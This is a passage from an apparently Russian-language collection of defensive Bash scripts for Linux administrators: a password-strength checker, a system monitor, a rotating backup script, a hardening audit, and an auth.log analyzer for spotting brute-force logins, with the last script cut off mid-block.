echo "  Результаты проверки пароля"
echo "========================================="
echo ""

# Проверка длины
if [[ $ДЛИНА -ge 16 ]]; then
    echo -e "${GREEN}[+]${NC} Длина: $ДЛИНА символов (отлично)"
    SCORE=$((SCORE + 30))
elif [[ $ДЛИНА -ge 12 ]]; then
    echo -e "${GREEN}[+]${NC} Длина: $ДЛИНА символов (хорошо)"
    SCORE=$((SCORE + 20))
elif [[ $ДЛИНА -ge 8 ]]; then
    echo -e "${YELLOW}[~]${NC} Длина: $ДЛИНА символов (допустимо)"
    SCORE=$((SCORE + 10))
else
    echo -e "${RED}[-]${NC} Длина: $ДЛИНА символов (слишком короткий!)"
fi

# Проверка заглавных букв
if echo "$PASSWORD" | grep -qP '[A-Z]'; then
    echo -e "${GREEN}[+]${NC} Содержит заглавные буквы"
    SCORE=$((SCORE + 10))
else
    echo -e "${RED}[-]${NC} Не содержит заглавных букв"
fi

# Проверка строчных букв
if echo "$PASSWORD" | grep -qP '[a-z]'; then
    echo -e "${GREEN}[+]${NC} Содержит строчные буквы"
    SCORE=$((SCORE + 10))
else
    echo -e "${RED}[-]${NC} Не содержит строчных букв"
fi

# Проверка цифр
if echo "$PASSWORD" | grep -qP '[0-9]'; then
    echo -e "${GREEN}[+]${NC} Содержит цифры"
    SCORE=$((SCORE + 10))
else
    echo -e "${RED}[-]${NC} Не содержит цифр"
fi

# Проверка спецсимволов
if echo "$PASSWORD" | grep -qP '[!@#$%^&*()_+\-=\[\]{};:,.<>?/\\|~`]'; then
    echo -e "${GREEN}[+]${NC} Содержит спецсимволы"
    SCORE=$((SCORE + 15))
else
    echo -e "${RED}[-]${NC} Не содержит спецсимволов"
fi

# Проверка повторяющихся символов
if echo "$PASSWORD" | grep -qP '(.)\1{2,}'; then
    echo -e "${RED}[-]${NC} Содержит повторяющиеся символы (aaa, 111)"
    SCORE=$((SCORE - 10))
fi

# Проверка последовательностей
if echo "$PASSWORD" | grep -qiP '(abc|bcd|cde|123|234|345|456|567|678|789|qwe|wer|ert)'; then
    echo -e "${RED}[-]${NC} Содержит последовательности символов"
    SCORE=$((SCORE - 10))
fi

# Проверка по словарю
PW_LOWER=$(echo "$PASSWORD" | tr '[:upper:]' '[:lower:]')
СЛОВАРНОЕ_СОВПАДЕНИЕ=""
for слово in "${СЛАБЫЕ_ПАРОЛИ[@]}"; do
    if [[ "$PW_LOWER" == *"$слово"* ]]; then
        СЛОВАРНОЕ_СОВПАДЕНИЕ="$слово"
        break
    fi
done

if [[ -n "$СЛОВАРНОЕ_СОВПАДЕНИЕ" ]]; then
    echo -e "${RED}[-]${NC} Содержит распространённое слово: '$СЛОВАРНОЕ_СОВПАДЕНИЕ'"
    SCORE=$((SCORE - 20))
else
    echo -e "${GREEN}[+]${NC} Не содержит распространённых слов"
    SCORE=$((SCORE + 15))
fi

# Ограничиваем оценку диапазоном 0-100
if [[ $SCORE -lt 0 ]]; then SCORE=0; fi
if [[ $SCORE -gt 100 ]]; then SCORE=100; fi

# Определяем уровень
echo ""
echo "-----------------------------------------"
if [[ $SCORE -ge 80 ]]; then
    echo -e "Оценка: ${SCORE}/100 ${GREEN}(СИЛЬНЫЙ)${NC}"
elif [[ $SCORE -ge 60 ]]; then
    echo -e "Оценка: ${SCORE}/100 ${YELLOW}(СРЕДНИЙ)${NC}"
elif [[ $SCORE -ge 40 ]]; then
    echo -e "Оценка: ${SCORE}/100 ${RED}(СЛАБЫЙ)${NC}"
else
    echo -e "Оценка: ${SCORE}/100 ${RED}(ОЧЕНЬ СЛАБЫЙ)${NC}"
fi
echo "========================================="
```

### 2.3 Мониторинг системы

```bash
#!/bin/bash
# ==============================================================================
# Мониторинг системы безопасности
#
# Описание:
#   Собирает информацию о состоянии системы: CPU, память, диск,
#   сетевые соединения, подозрительные процессы. Генерирует отчёт
#   и оповещает при обнаружении аномалий.
#
# Использование:
#   ./system_monitor.sh
#   ./system_monitor.sh --watch        # Непрерывный мониторинг (каждые 30 сек)
#   ./system_monitor.sh --report       # Полный отчёт в файл
#
# Пример вывода:
#   === Мониторинг системы: 2024-01-15 10:30:00 ===
#   
#   [CPU]    Загрузка: 23.5% | Средняя: 1.2 1.5 1.8
#   [ПАМЯТЬ] Использовано: 4.2G / 8.0G (52%)
#   [ДИСК]   /: 45% использовано
#   [СЕТЬ]   Установленных соединений: 42
#   [!]      ВНИМАНИЕ: Высокая загрузка CPU!
# ==============================================================================

set -uo pipefail

# Цвета
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Пороговые значения для оповещений
CPU_ПОРОГ=80
ПАМЯТЬ_ПОРОГ=85
ДИСК_ПОРОГ=90
СОЕДИНЕНИЯ_ПОРОГ=200

REPORT_FILE=""
WATCH_MODE=false

# Разбор аргументов
while [[ $# -gt 0 ]]; do
    case $1 in
        --watch)  WATCH_MODE=true; shift ;;
        --report) REPORT_FILE="system_report_$(date '+%Y%m%d_%H%M%S').txt"; shift ;;
        *)        shift ;;
    esac
done

# Функция вывода (в терминал и/или файл)
вывод() {
    echo -e "$1"
    if [[ -n "$REPORT_FILE" ]]; then
        echo -e "$1" | sed 's/\x1b\[[0-9;]*m//g' >> "$REPORT_FILE"
    fi
}

# Мониторинг CPU
проверить_cpu() {
    local cpu_usage
    cpu_usage=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'.' -f1)
    local load_avg
    load_avg=$(uptime | awk -F'load average:' '{print $2}' | xargs)

    if [[ $cpu_usage -ge $CPU_ПОРОГ ]]; then
        вывод "${RED}[CPU]    Загрузка: ${cpu_usage}% | Средняя: ${load_avg} [ВНИМАНИЕ!]${NC}"
    else
        вывод "${GREEN}[CPU]    Загрузка: ${cpu_usage}% | Средняя: ${load_avg}${NC}"
    fi
}

# Мониторинг памяти
проверить_память() {
    local mem_info
    mem_info=$(free -h | awk '/^Mem:/ {printf "%s / %s (%s)", $3, $2, $5}')
    local mem_percent
    mem_percent=$(free | awk '/^Mem:/ {printf "%.0f", $3/$2*100}')

    if [[ $mem_percent -ge $ПАМЯТЬ_ПОРОГ ]]; then
        вывод "${RED}[ПАМЯТЬ] Использовано: ${mem_info} [ВНИМАНИЕ!]${NC}"
    else
        вывод "${GREEN}[ПАМЯТЬ] Использовано: ${mem_info}${NC}"
    fi
}

# Мониторинг дисков
проверить_диски() {
    while IFS= read -r line; do
        local usage
        usage=$(echo "$line" | awk '{print $5}' | tr -d '%')
        local mount
        mount=$(echo "$line" | awk '{print $6}')
        local size
        size=$(echo "$line" | awk '{print $2}')

        if [[ $usage -ge $ДИСК_ПОРОГ ]]; then
            вывод "${RED}[ДИСК]   ${mount}: ${usage}% из ${size} [ВНИМАНИЕ!]${NC}"
        else
            вывод "${GREEN}[ДИСК]   ${mount}: ${usage}% из ${size}${NC}"
        fi
    done < <(df -h --type=ext4 --type=xfs --type=btrfs 2>/dev/null | tail -n +2)
}

# Мониторинг сетевых соединений
проверить_сеть() {
    local established
    established=$(ss -tun state established 2>/dev/null | tail -n +2 | wc -l)
    local listening
    listening=$(ss -tlun 2>/dev/null | tail -n +2 | wc -l)

    if [[ $established -ge $СОЕДИНЕНИЯ_ПОРОГ ]]; then
        вывод "${RED}[СЕТЬ]   Установленных: ${established} | Слушающих: ${listening} [ВНИМАНИЕ!]${NC}"
    else
        вывод "${GREEN}[СЕТЬ]   Установленных: ${established} | Слушающих: ${listening}${NC}"
    fi
}

# Проверка подозрительных процессов
проверить_процессы() {
    # Процессы, потребляющие много CPU
    local высокий_cpu
    высокий_cpu=$(ps aux --sort=-%cpu | awk 'NR>1 && $3>50 {printf "  PID %s: %s (CPU: %s%%)\n", $2, $11, $3}')

    if [[ -n "$высокий_cpu" ]]; then
        вывод "${YELLOW}[ПРОЦ]   Высокая загрузка CPU:${NC}"
        вывод "$высокий_cpu"
    fi

    # Процессы, потребляющие много памяти
    local высокая_память
    высокая_память=$(ps aux --sort=-%mem | awk 'NR>1 && $4>20 {printf "  PID %s: %s (MEM: %s%%)\n", $2, $11, $4}')

    if [[ -n "$высокая_память" ]]; then
        вывод "${YELLOW}[ПРОЦ]   Высокое потребление памяти:${NC}"
        вывод "$высокая_память"
    fi
}

# Проверка неудачных попыток входа
проверить_авторизацию() {
    local failed_logins=0
    if [[ -f /var/log/auth.log ]]; then
        failed_logins=$(grep -c "Failed password" /var/log/auth.log 2>/dev/null || echo 0)
    elif [[ -f /var/log/secure ]]; then
        failed_logins=$(grep -c "Failed password" /var/log/secure 2>/dev/null || echo 0)
    fi

    if [[ $failed_logins -gt 100 ]]; then
        вывод "${RED}[АВТОРИЗ] Неудачных входов: ${failed_logins} [ВНИМАНИЕ: возможен brute force!]${NC}"
    elif [[ $failed_logins -gt 0 ]]; then
        вывод "${YELLOW}[АВТОРИЗ] Неудачных входов: ${failed_logins}${NC}"
    else
        вывод "${GREEN}[АВТОРИЗ] Неудачных входов: 0${NC}"
    fi
}

# Проверка обновлений безопасности
проверить_обновления() {
    if command -v apt &>/dev/null; then
        local updates
        updates=$(apt list --upgradable 2>/dev/null | grep -c "security" || echo 0)
        if [[ $updates -gt 0 ]]; then
            вывод "${YELLOW}[ОБНОВЛ] Доступно обновлений безопасности: ${updates}${NC}"
        else
            вывод "${GREEN}[ОБНОВЛ] Система обновлена${NC}"
        fi
    fi
}

# Основная функция мониторинга
выполнить_мониторинг() {
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    вывод "\n${CYAN}=== Мониторинг системы: $timestamp ===${NC}\n"

    проверить_cpu
    проверить_память
    проверить_диски
    проверить_сеть
    проверить_процессы
    проверить_авторизацию
    проверить_обновления

    вывод "\n${CYAN}========================================${NC}"
}

# Основной цикл
if $WATCH_MODE; then
    echo "[*] Режим непрерывного мониторинга (Ctrl+C для выхода)"
    while true; do
        clear
        выполнить_мониторинг
        sleep 30
    done
else
    выполнить_мониторинг
    if [[ -n "$REPORT_FILE" ]]; then
        echo -e "\n[*] Отчёт сохранён: $REPORT_FILE"
    fi
fi
```

```bash
#!/bin/bash
# ==============================================================================
# Автоматическое резервное копирование с ротацией
#
# Описание:
#   Создаёт сжатые резервные копии указанных каталогов.
#   Поддерживает ротацию (удаление старых копий), логирование,
#   интеграцию с cron.
#
# Использование:
#   ./backup.sh /home/user /etc
#   ./backup.sh --config backup.conf
#
# Интеграция с cron (ежедневно в 2:00):
#   0 2 * * * /path/to/backup.sh /home/user /etc >> /var/log/backup.log 2>&1
#
# Пример вывода:
#   [2024-01-15 02:00:01] Начало резервного копирования
#   [2024-01-15 02:00:01] Архивирование: /home/user
#   [2024-01-15 02:01:23] Архивирование: /etc
#   [2024-01-15 02:01:30] Архив создан: backup_2024-01-15_020001.tar.gz (145M)
#   [2024-01-15 02:01:31] Контрольная сумма: SHA256 записана
#   [2024-01-15 02:01:31] Ротация: удалено 2 старых бэкапа
#   [2024-01-15 02:01:31] Резервное копирование завершено успешно
# ==============================================================================

set -euo pipefail

# === НАСТРОЙКИ ===
BACKUP_DIR="${BACKUP_DIR:-/var/backups/automated}"
MAX_BACKUPS=7                  # Хранить последних N бэкапов
COMPRESSION="gzip"             # gzip, bzip2, xz
LOG_FILE="/var/log/backup_script.log"
DATE_FORMAT=$(date '+%Y-%m-%d_%H%M%S')
ARCHIVE_NAME="backup_${DATE_FORMAT}"

# Функция логирования
лог() {
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local сообщение="[$timestamp] $1"
    echo "$сообщение"
    echo "$сообщение" >> "$LOG_FILE" 2>/dev/null || true
}

# Проверка аргументов
if [[ $# -eq 0 ]]; then
    echo "Использование: $0 КАТАЛОГ1 [КАТАЛОГ2] ..."
    echo "  Создаёт резервную копию указанных каталогов"
    echo ""
    echo "Переменные окружения:"
    echo "  BACKUP_DIR   - Каталог для бэкапов (по умолчанию: /var/backups/automated)"
    echo "  MAX_BACKUPS   - Количество хранимых копий (по умолчанию: 7)"
    exit 1
fi

# Проверяем каталоги для бэкапа
SOURCES=()
for src in "$@"; do
    if [[ -d "$src" ]]; then
        SOURCES+=("$src")
    else
        лог "ПРЕДУПРЕЖДЕНИЕ: Каталог не существует: $src"
    fi
done

if [[ ${#SOURCES[@]} -eq 0 ]]; then
    лог "ОШИБКА: Не найдено ни одного каталога для бэкапа"
    exit 1
fi

# Создаём каталог для бэкапов
mkdir -p "$BACKUP_DIR"

лог "=== Начало резервного копирования ==="
лог "Каталог бэкапов: $BACKUP_DIR"
лог "Источники: ${SOURCES[*]}"

# Определяем расширение и команду сжатия
case $COMPRESSION in
    "gzip")  EXT="tar.gz";  COMPRESS_FLAG="-z" ;;
    "bzip2") EXT="tar.bz2"; COMPRESS_FLAG="-j" ;;
    "xz")    EXT="tar.xz";  COMPRESS_FLAG="-J" ;;
    *)       EXT="tar.gz";  COMPRESS_FLAG="-z" ;;
esac

ARCHIVE_PATH="${BACKUP_DIR}/${ARCHIVE_NAME}.${EXT}"

# Создаём архив
лог "Создание архива: ${ARCHIVE_NAME}.${EXT}"
for src in "${SOURCES[@]}"; do
    лог "  Архивирование: $src"
done

if tar ${COMPRESS_FLAG} -cf "$ARCHIVE_PATH" "${SOURCES[@]}" 2>/dev/null; then
    # Размер архива
    ARCHIVE_SIZE=$(du -h "$ARCHIVE_PATH" | cut -f1)
    лог "Архив создан: ${ARCHIVE_NAME}.${EXT} (${ARCHIVE_SIZE})"

    # Контрольная сумма
    SHA256=$(sha256sum "$ARCHIVE_PATH" | cut -d' ' -f1)
    echo "$SHA256  ${ARCHIVE_NAME}.${EXT}" >> "${BACKUP_DIR}/checksums.sha256"
    лог "Контрольная сумма SHA256: ${SHA256:0:16}..."
else
    лог "ОШИБКА: Не удалось создать архив"
    exit 1
fi

# Ротация старых бэкапов
лог "Проверка ротации (максимум: $MAX_BACKUPS)"
BACKUP_COUNT=$(find "$BACKUP_DIR" -name "backup_*.${EXT}" -type f | wc -l)

if [[ $BACKUP_COUNT -gt $MAX_BACKUPS ]]; then
    REMOVE_COUNT=$((BACKUP_COUNT - MAX_BACKUPS))
    лог "Удаление $REMOVE_COUNT старых бэкапов"

    find "$BACKUP_DIR" -name "backup_*.${EXT}" -type f -printf '%T+ %p\n' \
        | sort | head -n "$REMOVE_COUNT" | awk '{print $2}' \
        | while read -r old_backup; do
            rm -f "$old_backup"
            лог "  Удалён: $(basename "$old_backup")"
        done
else
    лог "Ротация не требуется ($BACKUP_COUNT из $MAX_BACKUPS)"
fi

# Проверка целостности архива
лог "Проверка целостности архива..."
if tar ${COMPRESS_FLAG} -tf "$ARCHIVE_PATH" &>/dev/null; then
    лог "Целостность подтверждена"
else
    лог "ОШИБКА: Архив повреждён!"
    exit 1
fi

лог "=== Резервное копирование завершено успешно ==="
```

### 2.5 Linux Hardening Script

```bash
#!/bin/bash
# ==============================================================================
# Скрипт усиления безопасности Linux (Hardening)
#
# Описание:
#   Автоматизирует базовые шаги по усилению безопасности Linux-системы.
#   Каждое действие можно включить/выключить. Создаёт бэкап перед изменениями.
#
# ВНИМАНИЕ: Запускайте в тестовой среде перед применением на продакшене!
#
# Использование:
#   sudo ./hardening.sh --audit     # Только аудит (без изменений)
#   sudo ./hardening.sh --apply     # Применить изменения
#   sudo ./hardening.sh --rollback  # Откатить изменения
#
# Пример вывода (аудит):
#   === Аудит безопасности системы ===
#   
#   [ПРОВЕРКА] SSH конфигурация
#     [!] Root-доступ по SSH разрешён
#     [+] Парольная аутентификация отключена
#     [!] Не задан AllowUsers
#   
#   [ПРОВЕРКА] Файрвол
#     [!] UFW не активен
#   
#   [ПРОВЕРКА] Права на файлы
#     [+] /etc/passwd: 644 (корректно)
#     [!] /etc/shadow: 644 (должно быть 600!)
# ==============================================================================

set -uo pipefail

# Проверка root-прав
if [[ $EUID -ne 0 ]]; then
    echo "[!] Скрипт требует прав root. Запустите с sudo."
    exit 1
fi

# Цвета
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BACKUP_DIR="/root/hardening_backup_$(date +%Y%m%d_%H%M%S)"
MODE="${1:---audit}"
CHANGES_MADE=0

лог_хорошо()  { echo -e "  ${GREEN}[+]${NC} $1"; }
лог_плохо()   { echo -e "  ${RED}[!]${NC} $1"; }
лог_инфо()    { echo -e "  ${BLUE}[*]${NC} $1"; }
лог_раздел()  { echo -e "\n${YELLOW}[ПРОВЕРКА]${NC} $1"; }

# Создание бэкапа
создать_бэкап() {
    mkdir -p "$BACKUP_DIR"
    cp /etc/ssh/sshd_config "$BACKUP_DIR/" 2>/dev/null || true
    cp /etc/sysctl.conf "$BACKUP_DIR/" 2>/dev/null || true
    cp /etc/login.defs "$BACKUP_DIR/" 2>/dev/null || true
    echo "[*] Бэкап создан: $BACKUP_DIR"
}

# === АУДИТ SSH ===
проверить_ssh() {
    лог_раздел "SSH конфигурация"

    local sshd_config="/etc/ssh/sshd_config"
    if [[ ! -f "$sshd_config" ]]; then
        лог_инфо "SSH не установлен"
        return
    fi

    # Root-доступ
    if grep -qE "^\s*PermitRootLogin\s+(yes|without-password)" "$sshd_config" 2>/dev/null; then
        лог_плохо "Root-доступ по SSH разрешён"
        if [[ "$MODE" == "--apply" ]]; then
            sed -i 's/^\s*PermitRootLogin.*/PermitRootLogin no/' "$sshd_config"
            лог_инфо "Исправлено: PermitRootLogin no"
            CHANGES_MADE=1
        fi
    else
        лог_хорошо "Root-доступ по SSH запрещён"
    fi

    # Парольная аутентификация
    if grep -qE "^\s*PasswordAuthentication\s+yes" "$sshd_config" 2>/dev/null; then
        лог_плохо "Парольная аутентификация по SSH включена"
        if [[ "$MODE" == "--apply" ]]; then
            sed -i 's/^\s*PasswordAuthentication.*/PasswordAuthentication no/' "$sshd_config"
            лог_инфо "Исправлено: PasswordAuthentication no"
            CHANGES_MADE=1
        fi
    else
        лог_хорошо "Парольная аутентификация отключена"
    fi

    # Пустые пароли
    if grep -qE "^\s*PermitEmptyPasswords\s+yes" "$sshd_config" 2>/dev/null; then
        лог_плохо "Разрешены пустые пароли"
    else
        лог_хорошо "Пустые пароли запрещены"
    fi

    # Максимум попыток входа
    if grep -qE "^\s*MaxAuthTries\s+[0-3]$" "$sshd_config" 2>/dev/null; then
        лог_хорошо "Лимит попыток входа установлен"
    else
        лог_плохо "Лимит попыток входа не установлен (рекомендуется: 3)"
    fi

    # Протокол 2
    if grep -qE "^\s*Protocol\s+1" "$sshd_config" 2>/dev/null; then
        лог_плохо "Используется устаревший SSH Protocol 1"
    else
        лог_хорошо "SSH Protocol 2"
    fi
}

# === АУДИТ ФАЙРВОЛА ===
проверить_файрвол() {
    лог_раздел "Файрвол"

    if command -v ufw &>/dev/null; then
        if ufw status 2>/dev/null | grep -q "Status: active"; then
            лог_хорошо "UFW активен"
        else
            лог_плохо "UFW не активен"
            if [[ "$MODE" == "--apply" ]]; then
                ufw default deny incoming
                ufw default allow outgoing
                ufw allow ssh
                ufw --force enable
                лог_инфо "UFW активирован с базовыми правилами"
                CHANGES_MADE=1
            fi
        fi
    elif command -v iptables &>/dev/null; then
        local rules
        rules=$(iptables -L -n 2>/dev/null | wc -l)
        if [[ $rules -gt 8 ]]; then
            лог_хорошо "iptables содержит правила ($rules строк)"
        else
            лог_плохо "iptables практически пуст"
        fi
    else
        лог_плохо "Файрвол не обнаружен"
    fi
}

# === АУДИТ ПРАВ НА ФАЙЛЫ ===
проверить_права() {
    лог_раздел "Права на критические файлы"

    declare -A ФАЙЛЫ_ПРАВА=(
        ["/etc/passwd"]="644"
        ["/etc/shadow"]="600"
        ["/etc/group"]="644"
        ["/etc/gshadow"]="600"
        ["/etc/ssh/sshd_config"]="600"
    )

    for файл in "${!ФАЙЛЫ_ПРАВА[@]}"; do
        if [[ -f "$файл" ]]; then
            local текущие_права
            текущие_права=$(stat -c "%a" "$файл")
            local ожидаемые="${ФАЙЛЫ_ПРАВА[$файл]}"

            if [[ "$текущие_права" == "$ожидаемые" ]]; then
                лог_хорошо "$файл: $текущие_права (корректно)"
            else
                лог_плохо "$файл: $текущие_права (должно быть $ожидаемые)"
                if [[ "$MODE" == "--apply" ]]; then
                    chmod "$ожидаемые" "$файл"
                    лог_инфо "Исправлено: chmod $ожидаемые $файл"
                    CHANGES_MADE=1
                fi
            fi
        fi
    done
}

# === АУДИТ ЯДРА (sysctl) ===
проверить_sysctl() {
    лог_раздел "Параметры ядра (sysctl)"

    declare -A ПАРАМЕТРЫ=(
        ["net.ipv4.ip_forward"]="0"
        ["net.ipv4.conf.all.send_redirects"]="0"
        ["net.ipv4.conf.all.accept_redirects"]="0"
        ["net.ipv4.conf.all.accept_source_route"]="0"
        ["net.ipv4.icmp_echo_ignore_broadcasts"]="1"
        ["net.ipv4.conf.all.log_martians"]="1"
        ["net.ipv4.tcp_syncookies"]="1"
    )

    for param in "${!ПАРАМЕТРЫ[@]}"; do
        local текущее
        текущее=$(sysctl -n "$param" 2>/dev/null || echo "N/A")
        local ожидаемое="${ПАРАМЕТРЫ[$param]}"

        if [[ "$текущее" == "$ожидаемое" ]]; then
            лог_хорошо "$param = $текущее"
        else
            лог_плохо "$param = $текущее (рекомендуется: $ожидаемое)"
        fi
    done
}

# === АУДИТ ПОЛЬЗОВАТЕЛЕЙ ===
проверить_пользователей() {
    лог_раздел "Учётные записи пользователей"

    # Пользователи с UID 0 (кроме root)
    local uid0_users
    uid0_users=$(awk -F: '$3 == 0 && $1 != "root" {print $1}' /etc/passwd)
    if [[ -n "$uid0_users" ]]; then
        лог_плохо "Пользователи с UID 0 (кроме root): $uid0_users"
    else
        лог_хорошо "Нет дополнительных пользователей с UID 0"
    fi

    # Пользователи без пароля
    local no_pass
    no_pass=$(awk -F: '($2 == "" || $2 == "!") && $1 != "root" {print $1}' /etc/shadow 2>/dev/null)
    if [[ -n "$no_pass" ]]; then
        лог_плохо "Аккаунты без пароля: $no_pass"
    else
        лог_хорошо "Все аккаунты имеют пароли"
    fi

    # SUID файлы
    local suid_count
    suid_count=$(find / -perm -4000 -type f 2>/dev/null | wc -l)
    лог_инфо "Файлов с SUID-битом: $suid_count"
}

# === ОСНОВНАЯ ЛОГИКА ===
echo ""
echo "============================================="
echo "  Аудит безопасности Linux"
echo "  Режим: $MODE"
echo "  Дата: $(date '+%Y-%m-%d %H:%M:%S')"
echo "============================================="

if [[ "$MODE" == "--apply" ]]; then
    создать_бэкап
fi

проверить_ssh
проверить_файрвол
проверить_права
проверить_sysctl
проверить_пользователей

echo ""
echo "============================================="
if [[ "$MODE" == "--audit" ]]; then
    echo "  Аудит завершён. Для применения: $0 --apply"
elif [[ $CHANGES_MADE -eq 1 ]]; then
    echo "  Изменения применены. Бэкап: $BACKUP_DIR"
    echo "  Для отката: скопируйте файлы из бэкапа обратно"
else
    echo "  Система соответствует рекомендациям."
fi
echo "============================================="
```

### 2.6 Лог-анализатор (анализ auth.log)

```bash
#!/bin/bash
# ==============================================================================
# Анализатор логов безопасности
#
# Описание:
#   Анализирует /var/log/auth.log для обнаружения:
#   - Попыток brute force
#   - Подозрительных IP-адресов
#   - Успешных/неудачных входов
#   - Попыток повышения привилегий (sudo)
#
# Использование:
#   sudo ./log_analyzer.sh
#   sudo ./log_analyzer.sh -f /var/log/auth.log -n 20
#   sudo ./log_analyzer.sh --today
#
# Пример вывода:
#   === Анализ логов безопасности ===
#   
#   [BRUTE FORCE] Обнаружены подозрительные IP:
#   IP-адрес          Попытки  Страна
#   45.33.32.156      1523     CN
#   185.220.101.34    892      RU
#   
#   [ВХОДЫ] Успешные входы:
#   user1  2024-01-15 09:00  192.168.1.10
#   root   2024-01-15 03:22  10.0.0.1
# ==============================================================================

set -uo pipefail

# Настройки
LOG_FILE="/var/log/auth.log"
TOP_N=10
TODAY_ONLY=false
BRUTE_FORCE_THRESHOLD=5

# Цвета
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Разбор аргументов
while [[ $# -gt 0 ]]; do
    case $1 in
        -f|--file)  LOG_FILE="$2"; shift 2 ;;
        -n|--top)   TOP_N="$2"; shift 2 ;;
        --today)    TODAY_ONLY=true; shift ;;
        -h|--help)
            echo "Использование: $0 [-f ФАЙЛ_ЛОГА] [-n ТОП_N] [--today]"
            exit 0
            ;;
        *) shift ;;
    esac
done

# Проверяем наличие файла лога
if [[ ! -f "$LOG_FILE" ]]; then
    # Пробуем альтернативный путь
    if [[ -f "/var/log/secure" ]]; then
        LOG_FILE="/var/log/secure"
    else
        echo "[!] Файл логов не найден: $LOG_FILE"
        exit 1
    fi
fi

# Фильтр по дате
if $TODAY_ONLY; then
    TODAY=$(date '+%b %e')
    FILTER="grep '^${TODAY}'"
else
    FILTER="cat"
fi

echo ""
echo -e "${CYAN}=================================================${NC}"
echo -e "${CYAN}  Анализатор логов безопасности${NC}"
echo -e "${CYAN}  Файл: $LOG_FILE${NC}"
echo -e "${CYAN}  Дата: $(date '+%Y-%m-%d %H:%M:%S')${NC}"
echo -e "${CYAN}=================================================${NC}"

# === НЕУДАЧНЫЕ ПОПЫТКИ ВХОДА ===
echo -e "\n${YELLOW}[1] НЕУДАЧНЫЕ ПОПЫТКИ ВХОДА${NC}\n"

FAILED_TOTAL=$(eval "$FILTER" < "$LOG_FILE" | grep -c "Failed password" 2>/dev/null || echo 0)
echo "  Всего неудачных попыток: $FAILED_TOTAL"

if [[ $FAILED_TOTAL -gt 0 ]]; then
    echo ""
    echo "  Топ-${TOP_N} IP-адресов по неудачным попыткам:"
    echo -e "  ${CYAN}IP-адрес               Попытки${NC}"
    echo "  ----------------------------------------"
    eval "$FILTER" < "$LOG_FILE" \
        | grep "Failed password" \
        | grep -oP 'from \K[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' \
        | sort | uniq -c | sort -rn | head -n "$TOP_N" \
        | while read -r count ip; do
            if [[ $count -ge $BRUTE_FORCE_THRESHOLD ]]; then
                echo -e "  ${RED}${ip}$(printf '%*s' $((22 - ${#ip})) '')${count} [BRUTE FORCE!]${NC}"
            else
                echo "  ${ip}$(printf '%*s' $((22 - ${#ip})) '')${count}"
            fi
        done

    echo ""
    echo "  Топ-${TOP_N} целевых имён пользователей:"
    echo -e "  ${CYAN}Имя пользователя       Попытки${NC}"
    echo "  ----------------------------------------"
    eval "$FILTER" < "$LOG_FILE" \
        | grep "Failed password" \
        | grep -oP 'for (invalid user )?\K\S+' \
        | sort | uniq -c | sort -rn | head -n "$TOP_N" \
        | while read -r count user; do
            echo "  ${user}$(printf '%*s' $((22 - ${#user})) '')${count}"
        done
fi

# === УСПЕШНЫЕ ВХОДЫ ===
echo -e "\n${YELLOW}[2] УСПЕШНЫЕ ВХОДЫ${NC}\n"

ACCEPTED_TOTAL=$(eval "$FILTER" < "$LOG_FILE" | grep -c "Accepted" 2>/dev/null || echo 0)
echo "  Всего успешных входов: $ACCEPTED_TOTAL"

if [[ $ACCEPTED_TOTAL -gt 0 ]]; then
    echo ""
    echo -e "  ${CYAN}Последние успешные входы:${NC}"
    eval "$FILTER" < "$LOG_FILE" \
        | grep "Accepted" \
        | tail -n "$TOP_N" \
        | while IFS= read -r line; do
            user=$(echo "$line" | grep -oP 'for \K\S+')
            ip=$(echo "$line" | grep -oP 'from \K[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
            date_part=$(echo "$line" | awk '{print $1, $2, $3}')
            method=$(echo "$line" | grep -oP 'Accepted \K\S+')
            echo "  $date_part  $user  $ip  ($method)"
        done
fi

# === ИСПОЛЬЗОВАНИЕ SUDO ===
echo -e "\n${YELLOW}[3] ИСПОЛЬЗОВАНИЕ SUDO${NC}\n"

SUDO_TOTAL=$(eval "$FILTER" < "$LOG_FILE" | grep -c "sudo:" 2>/dev/null || echo 0)
echo "  Всего sudo-команд: $SUDO_TOTAL"

# Неудачные sudo
SUDO_FAILED=$(eval "$FILTER" < "$LOG_FILE" | grep -c "sudo.*authentication failure" 2>/dev/null || echo 0)
if [[ $SUDO_FAILED -gt 0 ]]; then
    echo -e "  ${RED}Неудачных попыток sudo: $SUDO_FAILED${NC}"
fi

# === ДРУГИЕ СОБЫТИЯ БЕЗОПАСНОСТИ ===
echo -e "\n${YELLOW}[4] ДРУГИЕ СОБЫТИЯ${NC}\n"

# Новые пользователи
NEW_USERS=$(eval "$FILTER" < "$LOG_FILE" | grep -c "new user" 2>/dev/null || echo 0)
if [[ $NEW_USERS -gt 0 ]]; then
    echo -e "  ${YELLOW}Новые пользователи: $NEW_USERS${NC}"
    eval "$FILTER" < "$LOG_FILE" | grep "new user" | tail -5 \
        | while IFS= read -r line; do
            echo "    $line"
        done
fi

# Изменения пароля
PASSWD_CHANGES=$(eval "$FILTER" < "$LOG_FILE" | grep -c "password changed" 2>/dev/null || echo 0)
if [[ $PASSWD_CHANGES -gt 0 ]]; then
    echo "  Изменений пароля: $PASSWD_CHANGES"
fi

# === ИТОГО ===
echo ""
echo -e "${CYAN}=================================================${NC}"
echo "  ИТОГО:"
echo "  Неудачных входов: $FAILED_TOTAL"
echo "  Успешных входов: $ACCEPTED_TOTAL"
echo "  Sudo команд: $SUDO_TOTAL"
echo "  Неудачных sudo: $SUDO_FAILED"

# Определяем уровень угрозы
if [[ $FAILED_TOTAL -gt 1000 ]]; then
    echo -e "\n  ${RED}УРОВЕНЬ УГРОЗЫ: ВЫСОКИЙ${NC}"
    echo -e "  ${RED}Рекомендуется: установить fail2ban, проверить файрвол${NC}"
elif [[ $FAILED_TOTAL -gt 100 ]]; then
    echo -e "\n  ${YELLOW}УРОВЕНЬ УГРОЗЫ: СРЕДНИЙ${NC}"
    echo -e "  ${YELLOW}Рекомендуется: мониторить IP-адреса, настроить fail2ban${NC}"
else
